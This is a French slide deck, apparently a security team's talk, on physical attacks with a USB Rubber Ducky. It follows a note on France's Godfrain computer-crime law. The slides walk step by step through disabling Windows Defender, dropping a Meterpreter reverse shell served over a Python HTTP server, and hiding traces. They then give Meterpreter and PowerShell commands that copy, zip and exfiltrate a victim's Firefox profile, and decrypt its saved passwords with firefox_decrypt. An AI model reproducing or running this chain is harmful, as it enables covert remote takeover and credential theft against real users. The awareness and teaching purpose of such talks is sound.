## Injection physique

### YourLabs Business Service
### SecOps team

---

Les dispositions de la loi Godfrain sont intégrées dans le Code pénal, livre III (« Des crimes et délits contre les biens »), titre II (« Des autres atteintes aux biens »), chap. III : « Des atteintes aux systèmes de traitement automatisé de données ». Selon les infractions retenues, les peines peuvent aller de 2 ans de prison et 30 000 euros d'amende à 10 ans d'emprisonnement et 150 000 euros d'amende (pour l'une quelconque de ces infractions commise en « bande organisée » à l'encontre d'un STAD de l'État). Par ailleurs, ces peines peuvent être accompagnées de privation de droits civiques et d'autres mesures (interdiction de travailler dans la fonction publique, exclusion des marchés publics, etc.).

Note:
La loi Godfrain du 5 janvier 1988, ou Loi no 88-19 du 5 janvier 1988 relative à la fraude informatique, est la première loi française réprimant les actes de criminalité informatique et de piratage. Nommée d'après le député RPR Jacques Godfrain, c'est l'une des lois pionnières concernant le droit des NTIC, après, notamment, la loi Informatique et libertés de 1978, qui introduit la notion de système de traitement automatisé de données (STAD) et prévoit plusieurs dispositions corrélatives de la loi Godfrain (notamment concernant les obligations du responsable du traitement quant à la garantie de la sécurité des données - art. 34 loi de 1978).


---

## RubberDucky

---?image=assets/mrrobot.jpg&size=contain

Note:
- vu dans Mr. Robot
- Elliot Alderson est un jeune informaticien vivant à New York, qui travaille en tant que technicien en sécurité informatique pour Allsafe Security. Celui-ci luttant constamment contre un trouble dissociatif de l'identité et de dépression, son processus de pensée semble fortement influencé par la paranoïa et l'illusion. Il pirate les comptes des gens, ce qui le conduit souvent à agir comme un cyber-justicier. Elliot rencontre « Mr. Robot », un mystérieux anarchiste qui souhaite le recruter dans son groupe de hackers connu sous le nom de « Fsociety ». Leur objectif consiste à rétablir l'équilibre de la société par la destruction des infrastructures des plus grosses banques et entreprises du monde, notamment le conglomérat E Corp. (surnommé « Evil Corp. » par Elliot) qui, comme client, par ailleurs, représente 80 % du chiffre d’affaires d’Allsafe Security.

---

## Fonctionnement

- clef usb d'apparence anodine |
- en fait un clavier scripté |
- 1000+ mots par minute |
- marche très bien sur tout OS bien à jour |

---?image=assets/ducky.jpg&size=contain

Note:
- une clef usb
- une carte memoire pour scripter la clef usb
- un etuit pour une illusion parfaite

---?image=assets/duckyclosed.png&size=contain

Note: le logo n'est pas present sur la version de production

---

## Exemples d'objectifs

- desactiver les antivirus |
- configurer un proxy |
- modifier d'autres paramêtres |
- démarrer un reverse shell |
- insertion de certificat d'autorité |
- démarrer des scripts powershell |
- tels que des ransomwares |

---?code=cmc/payload/meterpreter.txt&title=Exemple de script RubberDucky

@[1](Attendre 700 millisecondes)
@[2](Tappez Echap)
@[3](Attendre 100 millisecondes)
@[4](Ouvrir le menu démarrer)
@[6](Tapper "Windows Security")
@[8](Tapper Enter pour ouvrir la fenêtre de sécurité Windows)
@[10](Tapper Enter pour ouvrir "Protection")
@[11-18](Faire TAB 4 fois)
@[20](Tapper Enter pour ouvrir les paramêtres de protection)
@[22](Passe la protection de "Activée" à "Desactivée")
@[24](Passe de "Non" à "Oui" dans la confirmation)
@[26](Valide)
@[75](Ouvre l'executeur de commande)
@[77](Tapper la commande qui telecharge notre reverse shell)
@[83](Tapper la commande qui execute le reverse shell)
@[86-94](Efface les notifications pour ne pas laisser de trace)

---

# Compilation

![img](assets/comp.png)

Note:
- le compilateur est fournit en .jar c'est du java compilé et packagé
- `-i` input
- `-l` output, doit tjs etre inject.bin
- le plus important `-l` clavier

---

## Reverse shell

![img](assets/msfv.png)

Note:
- Un reverse shell est un programme qui permet d'obtennir un acces distant pour
  executer des commandes
- Le but est de l'executer sur la machine de la victime pour qu'il se
  connecte a un shell qu'on a mit en ecoute de connection sur un serveur
- On utilise Msfvenom pour creer le payoad et Metasploit pour le server
  Meterpreter (cest sur celui ci que la victime va se connecter:
- `-a`: l'architecture CPU
- `--platform`: la plateforme (windows, android, nix...)
- `-p`: Le paylaod, dans ce cas meterpreter reverse_tcp
- `LHOST`: l'ip du server meterpreter
- `LPORT`: le port du server meterpreter
- `-e`: l'encoding
- `-f`: le format
- `>` /tmp/mad/666.exe: la destination

---

# Distribution

```
cd /tmp/mad && python -m http.server
# Sous ubuntu, debian... il faut utiliser python3 -m http.server
# car python = python2 sous ArchLinux python = python3
```

Note:
Une fois pret on utilise un petit server http pour que la victime puisse telecharger notre exe malvaillante

---

![img](assets/msf.png)

---

# Demo

---?video=https://yourlabs.io/oss/security/raw/master/assets/ducky-windoz.mp4

Note:
- Conclusion: ne ramassez pas les clefs usb que vous trouvez dans la rue

---?video=https://yourlabs.io/oss/security/raw/master/assets/msf-reverseshell.mp4
---

## Usages

- Vol de mots de passe firefox |
- Keylogger |
- Screen capture |
- Downloader et uploader des fichiers |
- Implementation d'un ransome ware |
- Reconnaissance et mouvement transversaux dans le reseau |
- ... |

---

## Vol de mots de passe Firefox

```
meterpreter > shell
> powershell
> cd /users/<user> #(utilisez whoami pr le savoir)
> copy-item /users/33768/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release -destination /windows/temp/mad.default-release -recurse
> Compress-Archive -Path /windows/temp/mad.default-release -DestinationPath /windows/temp/mad.default-release.zip
> exit
> exit
meterpreter > Download /windows/temp/mad.default-release.zip /tmp
```

@[1](Lancer cmd)
@[2](Lancer powershell)
@[3-4](Copie des fichiers .default-release de firefox)
@[5](Compression dans fichiers dans une archive zip)
@[6-7](On exit 2 fois pour revenir au prompt `meterpreter >`)
@[8](Exifltration de l'archive zip)

Note:
Dans notre sessions meterpreter on zip les fichiers de profile firefox:

---

# Extraction

```
$ unzip mad.default-release.zip
$ sudo cp -r mad.default-release /home/<you>/.mozilla/firefox
$ sudo chown -R ${USER}. /home/<you>/.mozilla/firefox/mad.default-release
```

Note:
Dans un autre terminal, on unzip et place les fichier dans le repetoir ~/.mozila/firefox

---

## Configuration

```
[Profile2]
Name=default-release
IsRelative=1
Path=mad.default-release
```

Note:
Par la suite on edite `~/.mozilla/firefox/profiles.ini avec le nouveau profile`

---

## Dechiffrement

```
$ git clone https://github.com/unode/firefox_decrypt.git
$ cd firefox_decrypt
$ python firefox_decrypt.py
```

Note:
On utilise un outil appellé "firefox-decrypt":

---

## Resultat

![img](assets/password.png)

---

# Conclusion

- pas besoin de vulnérabilité logicielle |
- si ce n'est l'accès physique |
- négligence, lockpicking, social engineering ... |
- necessite compétences variées et combinées |

---

# Merci

### yourlabs.io/oss/security
